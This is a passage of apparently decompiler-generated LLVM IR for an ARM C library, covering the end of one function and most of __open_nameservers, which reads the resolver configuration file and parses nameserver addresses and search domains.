  %v0_2fc84 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_2fc90.pre = load i32, i32* %r0.global-to-local, align 4
  br i1 %v0_2fc84, label %dec_label_pc_2fc8c, label %bb8

bb8:                                              ; preds = %bb7
  %v2_2fc84 = add i32 %v1_2fc90.pre, 1
  store i32 %v2_2fc84, i32* %r0.global-to-local, align 4
  %v1_2fc58 = inttoptr i32 %v2_2fc84 to i8*
  %v2_2fc58 = load i8, i8* %v1_2fc58, align 1
  %v2_2fc5c = icmp eq i8 %v2_2fc58, 0
  store i1 %v2_2fc5c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_2fc5c, label %dec_label_pc_2fc8c, label %bb8.dec_label_pc_2fc68_crit_edge

bb8.dec_label_pc_2fc68_crit_edge:                 ; preds = %bb8
  %v0_2fc68.pre = load i32, i32* @ip, align 4
  %v1_2fc68.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_2fc68

dec_label_pc_2fc8c:                               ; preds = %bb8, %dec_label_pc_2fc68, %bb7, %entry
  %v1_2fc90 = phi i32 [ %v0_2fc58.pre, %entry ], [ %v1_2fc90.pre, %bb7 ], [ %v2_2fc8014, %dec_label_pc_2fc68 ], [ %v2_2fc84, %bb8 ]
  %v2_2fc8c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_2fc8c, i32* @r4, align 4
  ret i32 %v1_2fc90

; uselistorder directives
  uselistorder i8 %v2_2fc58, { 2, 1, 0 }
  uselistorder i8* %v1_2fc58, { 1, 0 }
  uselistorder i32 %v2_2fc84, { 0, 2, 3, 1 }
  uselistorder i1 %v2_2fc70, { 1, 0 }
  uselistorder i8 %v2_2fc5816, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 2, 0, 1 }
  uselistorder i1* %cpsr_z.global-to-local, { 3, 1, 0, 2, 4 }
  uselistorder i32 20828, { 0, 4, 5, 6, 2, 3, 1, 7 }
  uselistorder label %dec_label_pc_2fc8c, { 0, 2, 1, 3 }
  uselistorder label %bb7, { 1, 0 }
  uselistorder label %dec_label_pc_2fc68, { 1, 0 }
}

define i32 @__open_nameservers() local_unnamed_addr {
entry:
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp38 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-544 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-304 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-68 = alloca i16, align 2
  %stack_var_-288 = alloca i32, align 4
  %stack_var_-160 = alloca i32, align 4
  %stack_var_-560 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_2fc9c = load i32, i32* @r4, align 4
  store i32 %v3_2fc9c, i32* %stack_var_-36, align 4
  %v15_2fc9c = load i32, i32* @r8, align 4
  %v18_2fc9c = load i32, i32* @sb, align 4
  %v21_2fc9c = load i32, i32* @sl, align 4
  %v24_2fc9c = load i32, i32* @fp, align 4
  %v27_2fc9c = load i32, i32* @lr, align 4
  store i32 61984, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* @r5, align 4
  %v4_2fcac = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 61984) to i32*), align 4
  store i32 %v4_2fcac, i32* @r4, align 4
  %v2_2fcb0 = icmp eq i32 %v4_2fcac, 0
  br i1 %v2_2fcb0, label %dec_label_pc_2fcbc, label %dec_label_pc_2fcec

dec_label_pc_2fcbc:                               ; preds = %entry
  %v2_2fcc0 = ptrtoint i32* %stack_var_-160 to i32
  store i32 %v2_2fcc0, i32* %r1.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 -34424), i32* %r0.global-to-local, align 4
  %v2_2fcc8 = call i32 @__GI_stat(i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 -34424), i32 %v2_2fcc0)
  store i32 %v2_2fcc8, i32* %r0.global-to-local, align 4
  %v2_2fccc = icmp eq i32 %v2_2fcc8, 0
  %v1_2fcd0 = load i32, i32* @r4, align 4
  %.v1_2fcd0 = select i1 %v2_2fccc, i32 %tmp38, i32 %v1_2fcd0
  store i32 55972, i32* %r1.global-to-local, align 4
  store i32 %.v1_2fcd0, i32* %r2.global-to-local, align 4
  %v0_2fcdc = load i32, i32* @r5, align 4
  %v2_2fcdc = add i32 %v0_2fcdc, 55972
  %v3_2fcdc = inttoptr i32 %v2_2fcdc to i32*
  %v4_2fcdc = load i32, i32* %v3_2fcdc, align 4
  store i32 %v4_2fcdc, i32* %r3.global-to-local, align 4
  %v9_2fce0 = icmp eq i32 %v4_2fcdc, %.v1_2fcd0
  br i1 %v9_2fce0, label %bb58, label %bb

bb:                                               ; preds = %dec_label_pc_2fcbc
  store i32 %.v1_2fcd0, i32* %v3_2fcdc, align 4
  br label %bb58

bb58:                                             ; preds = %dec_label_pc_2fcbc, %bb
  store i32 195820, i32* @lr, align 4
  %v1_2fce8 = xor i1 %v9_2fce0, true
  call void @__pseudo_cond_branch(i1 %v1_2fce8, i32 ptrtoint (i32* @global_var_300f8.2062 to i32))
  %v0_2fcf0.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_2fcec

dec_label_pc_2fcec:                               ; preds = %entry, %bb58
  %v2_2fd04 = phi i32 [ ptrtoint (i32* @global_var_44990.1184 to i32), %entry ], [ %v0_2fcf0.pre, %bb58 ]
  store i32 61996, i32* %r3.global-to-local, align 4
  %v2_2fcf0 = add i32 %v2_2fd04, 61996
  %v3_2fcf0 = inttoptr i32 %v2_2fcf0 to i32*
  %v4_2fcf0 = load i32, i32* %v3_2fcf0, align 4
  store i32 %v4_2fcf0, i32* %r3.global-to-local, align 4
  %v2_2fcf4 = icmp eq i32 %v4_2fcf0, 0
  br i1 %v2_2fcf4, label %dec_label_pc_2fcfc, label %dec_label_pc_30090

dec_label_pc_2fcfc:                               ; preds = %dec_label_pc_2fcec
  %v4_2fd04 = add i32 %v2_2fd04, 20866
  %v5_2fd04 = inttoptr i32 %v4_2fd04 to i8*
  store i8 5, i8* %v5_2fd04, align 1
  store i32 -34424, i32* %r0.global-to-local, align 4
  store i32 20867, i32* %r3.global-to-local, align 4
  store i32 -36148, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v2_2fd18 = load i32, i32* @r5, align 4
  %v4_2fd18 = add i32 %v2_2fd18, 20867
  %v5_2fd18 = inttoptr i32 %v4_2fd18 to i8*
  store i8 3, i8* %v5_2fd18, align 1
  %v0_2fd1c = load i32, i32* @r5, align 4
  %v1_2fd1c = load i32, i32* %r0.global-to-local, align 4
  %v2_2fd1c = add i32 %v1_2fd1c, %v0_2fd1c
  store i32 %v2_2fd1c, i32* @r0, align 4
  %v1_2fd20 = load i32, i32* %r1.global-to-local, align 4
  %v2_2fd20 = add i32 %v1_2fd20, %v0_2fd1c
  store i32 %v2_2fd20, i32* @r1, align 4
  %v2_2fd24 = call i32 @__GI_fopen(i32 %v2_2fd1c, i32 %v2_2fd20)
  store i32 %v2_2fd24, i32* %r0.global-to-local, align 4
  store i32 %v2_2fd24, i32* @fp, align 4
  %v2_2fd28 = icmp eq i32 %v2_2fd24, 0
  br i1 %v2_2fd28, label %dec_label_pc_2ffb4, label %dec_label_pc_2ff5c

dec_label_pc_2fd34:                               ; preds = %dec_label_pc_2ff5c, %dec_label_pc_2ff90.backedge
  store i32 %v2_2ff90, i32* %r0.global-to-local, align 4
  %v2_2fd38 = call i32 @skip_and_NUL_space(i8* %v1_2fd38)
  store i32 %v2_2fd38, i32* %r0.global-to-local, align 4
  store i32 %v2_2fd38, i32* @r4, align 4
  %v0_2fd40 = call i32 @skip_nospace()
  store i32 %v0_2fd40, i32* %r0.global-to-local, align 4
  %v1_2fd44 = inttoptr i32 %v0_2fd40 to i8*
  %v2_2fd44 = call i32 @skip_and_NUL_space(i8* %v1_2fd44)
  store i32 %v2_2ff60, i32* @r1, align 4
  store i32 %v2_2fd44, i32* @r7, align 4
  %v0_2fd50 = load i32, i32* @r4, align 4
  store i32 %v0_2fd50, i32* %r0.global-to-local, align 4
  %v2_2fd54 = inttoptr i32 %v0_2fd50 to i8*
  %v3_2fd54 = call i32 @__GI_strcoll(i8* %v2_2fd54, i32 %v2_2ff60)
  store i32 %v3_2fd54, i32* %r0.global-to-local, align 4
  %sext = mul i32 %v3_2fd54, 16777216
  %v1_2fd58 = sdiv i32 %sext, 16777216
  store i32 %v1_2fd58, i32* @r6, align 4
  %sext.off = or i32 %sext, 16777215
  %tmp = icmp ult i32 %sext.off, 33554431
  br i1 %tmp, label %dec_label_pc_2fd60, label %dec_label_pc_2fe1c

dec_label_pc_2fd60:                               ; preds = %dec_label_pc_2fd34
  %v0_2fd60 = load i32, i32* @r7, align 4
  store i32 %v0_2fd60, i32* %r0.global-to-local, align 4
  %v0_2fd64 = call i32 @skip_nospace()
  %v1_2fd64 = inttoptr i32 %v0_2fd64 to i8*
  store i32 %v2_2fd68, i32* @r4, align 4
  %v0_2fd6c = load i32, i32* @r6, align 4
  %v1_2fd6c = trunc i32 %v0_2fd6c to i8
  store i8 %v1_2fd6c, i8* %v1_2fd64, align 1
  %v0_2fd70 = load i32, i32* @r6, align 4
  store i32 %v0_2fd70, i32* @r1, align 4
  store i32 28, i32* @r2, align 4
  store i32 %v2_2fd68, i32* @r0, align 4
  %v0_2fd7c = call i32 @__GI_memset()
  store i32 10, i32* %r0.global-to-local, align 4
  %v0_2fd84 = load i32, i32* @r7, align 4
  store i32 %v0_2fd84, i32* %r1.global-to-local, align 4
  store i32 %v2_2fd88, i32* %r2.global-to-local, align 4
  %v3_2fd8c = inttoptr i32 %v0_2fd84 to i8*
  %v4_2fd8c = call i32 @inet_pton(i32 10, i8* %v3_2fd8c, i32 %v2_2fd88)
  store i32 %v4_2fd8c, i32* %r0.global-to-local, align 4
  %tmp59 = icmp slt i32 %v4_2fd8c, 1
  br i1 %tmp59, label %dec_label_pc_2fd9c, label %dec_label_pc_2fdb8

dec_label_pc_2fd9c:                               ; preds = %dec_label_pc_2fd60
  %v0_2fd9c = load i32, i32* @r7, align 4
  store i32 %v0_2fd9c, i32* %r1.global-to-local, align 4
  store i32 %v2_2fda0, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_2fda8 = inttoptr i32 %v0_2fd9c to i8*
  %v4_2fda8 = call i32 @inet_pton(i32 2, i8* %v3_2fda8, i32 %v2_2fda0)
  store i32 %v4_2fda8, i32* %r0.global-to-local, align 4
  %tmp60 = icmp slt i32 %v4_2fda8, 1
  br i1 %tmp60, label %dec_label_pc_2ff90.backedge, label %dec_label_pc_2fdb8

dec_label_pc_2fdb8:                               ; preds = %dec_label_pc_2fd9c, %dec_label_pc_2fd60
  %v0_2fdbc.off0 = phi i16 [ 10, %dec_label_pc_2fd60 ], [ 2, %dec_label_pc_2fd9c ]
  store i32 %v2_2fdb8, i32* %r2.global-to-local, align 4
  store i16 %v0_2fdbc.off0, i16* %stack_var_-68, align 2
  store i32 13568, i32* %r3.global-to-local, align 4
  store i32 61996, i32* @r7, align 4
  %v0_2fdcc = load i32, i32* @r5, align 4
  %v2_2fdcc = add i32 %v0_2fdcc, 61996
  %v3_2fdcc = inttoptr i32 %v2_2fdcc to i32*
  %v4_2fdcc = load i32, i32* %v3_2fdcc, align 4
  store i32 61992, i32* @sl, align 4
  %v1_2fdd4 = add i32 %v4_2fdcc, 1
  store i32 %v1_2fdd4, i32* %r3.global-to-local, align 4
  store i32 28, i32* @r8, align 4
  %v2_2fddc = mul i32 %v1_2fdd4, 28
  store i32 %v2_2fddc, i32* %r1.global-to-local, align 4
  %v2_2fde0 = add i32 %v0_2fdcc, 61992
  %v3_2fde0 = inttoptr i32 %v2_2fde0 to i32*
  %v4_2fde0 = load i32, i32* %v3_2fde0, align 4
  store i32 %v4_2fde0, i32* %r0.global-to-local, align 4
  %v2_2fde4 = inttoptr i32 %v4_2fde0 to i32*
  %v3_2fde4 = call i32 @realloc(i32* %v2_2fde4, i32 %v2_2fddc)
  store i32 %v3_2fde4, i32* %r0.global-to-local, align 4
  store i32 %v3_2fde4, i32* @r6, align 4
  %v2_2fde8 = icmp eq i32 %v3_2fde4, 0
  br i1 %v2_2fde8, label %dec_label_pc_2ff90.backedge, label %dec_label_pc_2fdf0

dec_label_pc_2fdf0:                               ; preds = %dec_label_pc_2fdb8
  %v0_2fdf0 = load i32, i32* @r5, align 4
  %v1_2fdf0 = load i32, i32* @r7, align 4
  %v2_2fdf0 = add i32 %v1_2fdf0, %v0_2fdf0
  %v3_2fdf0 = inttoptr i32 %v2_2fdf0 to i32*
  %v4_2fdf0 = load i32, i32* %v3_2fdf0, align 4
  store i32 %v4_2fdf0, i32* %r4.global-to-local, align 4
  %v1_2fdf4 = load i32, i32* @r8, align 4
  %v3_2fdf4 = mul i32 %v1_2fdf4, %v4_2fdf0
  %v4_2fdf4 = add i32 %v3_2fdf4, %v3_2fde4
  store i32 %v4_2fdf4, i32* %lr.global-to-local, align 4
  %v2_2fdfc = load i16, i16* %stack_var_-68, align 2
  %v3_2fdfc = sext i16 %v2_2fdfc to i32
  store i32 %v3_2fdfc, i32* %r0.global-to-local, align 4
  %v6_2fdfc = load i32, i32* %stack_var_-64, align 4
  store i32 %v6_2fdfc, i32* %r1.global-to-local, align 4
  %v9_2fdfc = load i32, i32* %stack_var_-60, align 4
  store i32 %v9_2fdfc, i32* %r2.global-to-local, align 4
  store i32 %v14_2fdfc, i32* @ip, align 4
  %v2_2fe00 = load i32, i32* @sl, align 4
  %v3_2fe00 = add i32 %v2_2fe00, %v0_2fdf0
  %v4_2fe00 = inttoptr i32 %v3_2fe00 to i32*
  store i32 %v3_2fde4, i32* %v4_2fe00, align 4
  %v0_2fe04 = load i32, i32* %lr.global-to-local, align 4
  %v1_2fe04 = inttoptr i32 %v0_2fe04 to i32*
  %v2_2fe04 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v2_2fe04, i32* %v1_2fe04, align 4
  %v3_2fe04 = add i32 %v0_2fe04, 4
  %v4_2fe04 = inttoptr i32 %v3_2fe04 to i32*
  %v5_2fe04 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_2fe04, i32* %v4_2fe04, align 4
  %v6_2fe04 = add i32 %v0_2fe04, 8
  %v7_2fe04 = inttoptr i32 %v6_2fe04 to i32*
  %v8_2fe04 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_2fe04, i32* %v7_2fe04, align 4
  %v9_2fe04 = add i32 %v0_2fe04, 12
  %v10_2fe04 = inttoptr i32 %v9_2fe04 to i32*
  %v11_2fe04 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v11_2fe04, i32* %v10_2fe04, align 4
  %v12_2fe04 = add i32 %v0_2fe04, 16
  store i32 %v12_2fe04, i32* @lr, align 4
  %v2_2fe08 = load i32, i32* %stack_var_-52, align 4
  store i32 %v2_2fe08, i32* %r0.global-to-local, align 4
  %v0_2fe0c = load i32, i32* %r4.global-to-local, align 4
  %v1_2fe0c = add i32 %v0_2fe0c, 1
  store i32 %v1_2fe0c, i32* %r4.global-to-local, align 4
  %v1_2fe10 = inttoptr i32 %v12_2fe04 to i32*
  store i32 %v2_2fe08, i32* %v1_2fe10, align 4
  %v3_2fe10 = add i32 %v0_2fe04, 20
  %v4_2fe10 = inttoptr i32 %v3_2fe10 to i32*
  %v5_2fe10 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_2fe10, i32* %v4_2fe10, align 4
  %v6_2fe10 = add i32 %v0_2fe04, 24
  %v7_2fe10 = inttoptr i32 %v6_2fe10 to i32*
  %v8_2fe10 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_2fe10, i32* %v7_2fe10, align 4
  %v0_2fe14 = load i32, i32* %r4.global-to-local, align 4
  %v1_2fe14 = load i32, i32* @r5, align 4
  %v2_2fe14 = load i32, i32* @r7, align 4
  %v3_2fe14 = add i32 %v2_2fe14, %v1_2fe14
  %v4_2fe14 = inttoptr i32 %v3_2fe14 to i32*
  store i32 %v0_2fe14, i32* %v4_2fe14, align 4
  br label %dec_label_pc_2ff90.backedge

dec_label_pc_2ff90.backedge:                      ; preds = %dec_label_pc_2feb8, %dec_label_pc_2fea8, %dec_label_pc_2fe74, %dec_label_pc_2fdf0, %dec_label_pc_2ff48, %dec_label_pc_2fd9c, %dec_label_pc_2fdb8, %dec_label_pc_2fef0, %dec_label_pc_2fef8, %dec_label_pc_2fedc, %dec_label_pc_2ff2c
  %v0_2ff9c.pre = load i32, i32* @fp, align 4
  store i32 %v2_2ff90, i32* @r4, align 4
  store i32 %v2_2ff90, i32* %r0.global-to-local, align 4
  store i32 128, i32* %r1.global-to-local, align 4
  store i32 %v0_2ff9c.pre, i32* %r2.global-to-local, align 4
  %v3_2ffa0 = call i32 @fgets(i32 %v2_2ff90, i32 128, i32 %v0_2ff9c.pre)
  store i32 %v3_2ffa0, i32* %r0.global-to-local, align 4
  %v2_2ffa4 = icmp eq i32 %v3_2ffa0, 0
  br i1 %v2_2ffa4, label %dec_label_pc_2ffac, label %dec_label_pc_2fd34

dec_label_pc_2fe1c:                               ; preds = %dec_label_pc_2fd34
  %v0_2fe1c = load i32, i32* @r4, align 4
  store i32 %v0_2fe1c, i32* %r0.global-to-local, align 4
  store i32 %v2_2ff6c, i32* @r1, align 4
  %v2_2fe24 = inttoptr i32 %v0_2fe1c to i8*
  %v3_2fe24 = call i32 @__GI_strcoll(i8* %v2_2fe24, i32 %v2_2ff6c)
  store i32 %v3_2fe24, i32* %r0.global-to-local, align 4
  %v2_2fe28 = icmp eq i32 %v3_2fe24, 0
  br i1 %v2_2fe28, label %dec_label_pc_2fe5c, label %dec_label_pc_2fe30

dec_label_pc_2fe30:                               ; preds = %dec_label_pc_2fe1c
  %v0_2fe30 = load i32, i32* @r4, align 4
  store i32 %v0_2fe30, i32* %r0.global-to-local, align 4
  store i32 %v2_2ff78, i32* @r1, align 4
  %v2_2fe38 = inttoptr i32 %v0_2fe30 to i8*
  %v3_2fe38 = call i32 @__GI_strcoll(i8* %v2_2fe38, i32 %v2_2ff78)
  store i32 %v3_2fe38, i32* %r0.global-to-local, align 4
  %v2_2fe3c = icmp eq i32 %v3_2fe38, 0
  br i1 %v2_2fe3c, label %dec_label_pc_2fe5c, label %dec_label_pc_2fedc

dec_label_pc_2fe48:                               ; preds = %dec_label_pc_2fe5c, %dec_label_pc_2fe48.dec_label_pc_2fe48_crit_edge
  %v2_2fe4c = phi i32 [ %v1_2fe60, %dec_label_pc_2fe48.dec_label_pc_2fe48_crit_edge ], [ %v1_2fe6010, %dec_label_pc_2fe5c ]
  %v0_2fe4c = phi i32 [ %v1_2fe68, %dec_label_pc_2fe48.dec_label_pc_2fe48_crit_edge ], [ %v1_2fe6817, %dec_label_pc_2fe5c ]
  %v1_2fe48 = phi i32 [ %v1_2fe48.pre, %dec_label_pc_2fe48.dec_label_pc_2fe48_crit_edge ], [ 61988, %dec_label_pc_2fe5c ]
  %v1_2fe4c = phi i32 [ %v0_2fe60, %dec_label_pc_2fe48.dec_label_pc_2fe48_crit_edge ], [ %v0_2fe609, %dec_label_pc_2fe5c ]
  %v2_2fe48 = add i32 %v1_2fe4c, %v1_2fe48
  %v3_2fe48 = inttoptr i32 %v2_2fe48 to i32*
  %v4_2fe48 = load i32, i32* %v3_2fe48, align 4
  store i32 %v4_2fe48, i32* %r3.global-to-local, align 4
  %v3_2fe4c = add i32 %v1_2fe4c, %v2_2fe4c
  %v4_2fe4c = inttoptr i32 %v3_2fe4c to i32*
  store i32 %v0_2fe4c, i32* %v4_2fe4c, align 4
  %v0_2fe50 = load i32, i32* %r3.global-to-local, align 4
  %v1_2fe50 = load i32, i32* %r2.global-to-local, align 4
  %v4_2fe50 = mul i32 %v1_2fe50, 4
  %v5_2fe50 = add i32 %v4_2fe50, %v0_2fe50
  %v6_2fe50 = inttoptr i32 %v5_2fe50 to i32*
  %v7_2fe50 = load i32, i32* %v6_2fe50, align 4
  store i32 %v7_2fe50, i32* @r0, align 4
  %v0_2fe54 = call i32 @free()
  store i32 %v0_2fe54, i32* %r0.global-to-local, align 4
  %v0_2fe60 = load i32, i32* @r5, align 4
  %v1_2fe60 = load i32, i32* @sb, align 4
  %v2_2fe60 = add i32 %v1_2fe60, %v0_2fe60
  %v3_2fe60 = inttoptr i32 %v2_2fe60 to i32*
  %v4_2fe60 = load i32, i32* %v3_2fe60, align 4
  store i32 %v4_2fe60, i32* %r3.global-to-local, align 4
  %v2_2fe64 = icmp eq i32 %v4_2fe60, 0
  %v1_2fe68 = add i32 %v4_2fe60, -1
  store i32 %v1_2fe68, i32* %r2.global-to-local, align 4
  br i1 %v2_2fe64, label %dec_label_pc_2fe70, label %dec_label_pc_2fe48.dec_label_pc_2fe48_crit_edge

dec_label_pc_2fe48.dec_label_pc_2fe48_crit_edge:  ; preds = %dec_label_pc_2fe48
  %v1_2fe48.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_2fe48

dec_label_pc_2fe5c:                               ; preds = %dec_label_pc_2fe30, %dec_label_pc_2fe1c
  store i32 61988, i32* @r4, align 4
  %v0_2fe609 = load i32, i32* @r5, align 4
  %v1_2fe6010 = load i32, i32* @sb, align 4
  %v2_2fe6011 = add i32 %v1_2fe6010, %v0_2fe609
  %v3_2fe6012 = inttoptr i32 %v2_2fe6011 to i32*
  %v4_2fe6013 = load i32, i32* %v3_2fe6012, align 4
  store i32 %v4_2fe6013, i32* %r3.global-to-local, align 4
  %v2_2fe6415 = icmp eq i32 %v4_2fe6013, 0
  %v1_2fe6817 = add i32 %v4_2fe6013, -1
  store i32 %v1_2fe6817, i32* %r2.global-to-local, align 4
  br i1 %v2_2fe6415, label %dec_label_pc_2fe70, label %dec_label_pc_2fe48

dec_label_pc_2fe70:                               ; preds = %dec_label_pc_2fe48, %dec_label_pc_2fe5c
  store i32 61988, i32* @r6, align 4
  br label %dec_label_pc_2fe74

dec_label_pc_2fe74:                               ; preds = %dec_label_pc_2feb8, %dec_label_pc_2fe70
  %v0_2fe74 = load i32, i32* @r7, align 4
  store i32 %v0_2fe74, i32* %r0.global-to-local, align 4
  %v0_2fe78 = call i32 @skip_nospace()
  store i32 %v0_2fe78, i32* %r0.global-to-local, align 4
  %v1_2fe7c = inttoptr i32 %v0_2fe78 to i8*
  %v2_2fe7c = call i32 @skip_and_NUL_space(i8* %v1_2fe7c)
  store i32 %v2_2fe7c, i32* %r0.global-to-local, align 4
  %v0_2fe80 = load i32, i32* @r5, align 4
  %v1_2fe80 = load i32, i32* @sb, align 4
  %v2_2fe80 = add i32 %v1_2fe80, %v0_2fe80
  %v3_2fe80 = inttoptr i32 %v2_2fe80 to i32*
  %v4_2fe80 = load i32, i32* %v3_2fe80, align 4
  store i32 %v2_2fe7c, i32* @r4, align 4
  %tmp69 = mul i32 %v4_2fe80, 4
  %v3_2fe8c = add i32 %tmp69, 4
  store i32 %v3_2fe8c, i32* %r1.global-to-local, align 4
  %v1_2fe90 = load i32, i32* @r6, align 4
  %v2_2fe90 = add i32 %v1_2fe90, %v0_2fe80
  %v3_2fe90 = inttoptr i32 %v2_2fe90 to i32*
  %v4_2fe90 = load i32, i32* %v3_2fe90, align 4
  store i32 %v4_2fe90, i32* %r0.global-to-local, align 4
  %v2_2fe94 = inttoptr i32 %v4_2fe90 to i32*
  %v3_2fe94 = call i32 @realloc(i32* %v2_2fe94, i32 %v3_2fe8c)
  store i32 %v3_2fe94, i32* %r3.global-to-local, align 4
  %v2_2fe98 = icmp eq i32 %v3_2fe94, 0
  %v0_2fe9c = load i32, i32* @r7, align 4
  store i32 %v0_2fe9c, i32* %r0.global-to-local, align 4
  %v0_2fea0 = load i32, i32* @r4, align 4
  store i32 %v0_2fea0, i32* @r7, align 4
  br i1 %v2_2fe98, label %dec_label_pc_2ff90.backedge, label %dec_label_pc_2fea8

dec_label_pc_2fea8:                               ; preds = %dec_label_pc_2fe74
  %v1_2fea8 = load i32, i32* @r5, align 4
  %v2_2fea8 = load i32, i32* @r6, align 4
  %v3_2fea8 = add i32 %v2_2fea8, %v1_2fea8
  %v4_2fea8 = inttoptr i32 %v3_2fea8 to i32*
  store i32 %v3_2fe94, i32* %v4_2fea8, align 4
  %v1_2feac = inttoptr i32 %v0_2fe9c to i8*
  %v2_2feac = call i32 @__GI_strdup(i8* %v1_2feac)
  store i32 %v2_2feac, i32* %r0.global-to-local, align 4
  %v2_2feb0 = icmp eq i32 %v2_2feac, 0
  br i1 %v2_2feb0, label %dec_label_pc_2ff90.backedge, label %dec_label_pc_2feb8

dec_label_pc_2feb8:                               ; preds = %dec_label_pc_2fea8
  %v0_2feb8 = load i32, i32* @r5, align 4
  %v1_2feb8 = load i32, i32* @sb, align 4
  %v2_2feb8 = add i32 %v1_2feb8, %v0_2feb8
  %v3_2feb8 = inttoptr i32 %v2_2feb8 to i32*
  %v4_2feb8 = load i32, i32* %v3_2feb8, align 4
  store i32 %v4_2feb8, i32* %r3.global-to-local, align 4
  %v1_2febc = load i32, i32* @r6, align 4
  %v2_2febc = add i32 %v1_2febc, %v0_2feb8
  %v3_2febc = inttoptr i32 %v2_2febc to i32*
  %v4_2febc = load i32, i32* %v3_2febc, align 4
  store i32 %v4_2febc, i32* %r2.global-to-local, align 4
  %v1_2fec0 = add i32 %v4_2feb8, 1
  store i32 %v1_2fec0, i32* %r1.global-to-local, align 4
  %v5_2fec4 = mul i32 %v4_2feb8, 4
  %v6_2fec4 = add i32 %v4_2febc, %v5_2fec4
  %v7_2fec4 = inttoptr i32 %v6_2fec4 to i32*
  store i32 %v2_2feac, i32* %v7_2fec4, align 4
  %v0_2fec8 = load i32, i32* %r1.global-to-local, align 4
  %v1_2fec8 = load i32, i32* @r5, align 4
  %v2_2fec8 = load i32, i32* @sb, align 4
  %v3_2fec8 = add i32 %v2_2fec8, %v1_2fec8
  %v4_2fec8 = inttoptr i32 %v3_2fec8 to i32*
  store i32 %v0_2fec8, i32* %v4_2fec8, align 4
  %v0_2fecc = load i32, i32* @r4, align 4
  %v1_2fecc = inttoptr i32 %v0_2fecc to i8*
  %v2_2fecc = load i8, i8* %v1_2fecc, align 1
  %v3_2fecc = zext i8 %v2_2fecc to i32
  store i32 %v3_2fecc, i32* %r3.global-to-local, align 4
  %v2_2fed0 = icmp eq i8 %v2_2fecc, 0
  br i1 %v2_2fed0, label %dec_label_pc_2ff90.backedge, label %dec_label_pc_2fe74

dec_label_pc_2fedc:                               ; preds = %dec_label_pc_2fe30
  %v0_2fedc = load i32, i32* @r4, align 4
  store i32 %v0_2fedc, i32* %r0.global-to-local, align 4
  %v2_2fee0 = load i32, i32* %stack_var_-560, align 4
  store i32 %v2_2fee0, i32* @r1, align 4
  %v2_2fee4 = inttoptr i32 %v0_2fedc to i8*
  %v3_2fee4 = call i32 @__GI_strcoll(i8* %v2_2fee4, i32 %v2_2fee0)
  store i32 %v3_2fee4, i32* %r0.global-to-local, align 4
  %sext2 = mul i32 %v3_2fee4, 16777216
  %v1_2fee8 = sdiv i32 %sext2, 16777216
  store i32 %v1_2fee8, i32* @r4, align 4
  %sext2.off = or i32 %sext2, 16777215
  %tmp70 = icmp ult i32 %sext2.off, 33554431
  br i1 %tmp70, label %dec_label_pc_2fef0, label %dec_label_pc_2ff90.backedge

dec_label_pc_2fef0:                               ; preds = %dec_label_pc_2fedc
  %v0_2fef0 = load i32, i32* @r7, align 4
  %v2_2fef0 = icmp eq i32 %v0_2fef0, 0
  br i1 %v2_2fef0, label %dec_label_pc_2ff90.backedge, label %dec_label_pc_2fef8

dec_label_pc_2fef8:                               ; preds = %dec_label_pc_2fef0
  store i32 %v0_2fef0, i32* @r0, align 4
  store i32 58, i32* %r1.global-to-local, align 4
  %v2_2ff00 = call i32 @__GI_strchr(i32 %v0_2fef0, i32 58)
  store i32 %v2_2ff00, i32* %r0.global-to-local, align 4
  store i32 %v2_2ff00, i32* @r6, align 4
  %v3_2ff04 = icmp eq i32 %v2_2ff00, 0
  br i1 %v3_2ff04, label %dec_label_pc_2ff90.backedge, label %dec_label_pc_2ff0c

dec_label_pc_2ff0c:                               ; preds = %dec_label_pc_2fef8
  store i32 -34368, i32* %r1.global-to-local, align 4
  %v0_2ff10 = load i32, i32* @r4, align 4
  %v1_2ff10 = trunc i32 %v0_2ff10 to i8
  %v3_2ff10 = inttoptr i32 %v2_2ff00 to i8*
  store i8 %v1_2ff10, i8* %v3_2ff10, align 1
  %v0_2ff14 = load i32, i32* @r5, align 4
  %v1_2ff14 = load i32, i32* %r1.global-to-local, align 4
  %v2_2ff14 = add i32 %v1_2ff14, %v0_2ff14
  store i32 %v2_2ff14, i32* @r1, align 4
  %v0_2ff18 = load i32, i32* @r7, align 4
  store i32 %v0_2ff18, i32* %r0.global-to-local, align 4
  %v2_2ff1c = inttoptr i32 %v0_2ff18 to i8*
  %v3_2ff1c = call i32 @__GI_strcoll(i8* %v2_2ff1c, i32 %v2_2ff14)
  store i32 %v3_2ff1c, i32* %r0.global-to-local, align 4
  %v2_2ff20 = icmp eq i32 %v3_2ff1c, 0
  br i1 %v2_2ff20, label %dec_label_pc_2ff48, label %dec_label_pc_2ff2c

dec_label_pc_2ff2c:                               ; preds = %dec_label_pc_2ff0c
  %v0_2ff30 = load i32, i32* @r7, align 4
  store i32 %v0_2ff30, i32* %r0.global-to-local, align 4
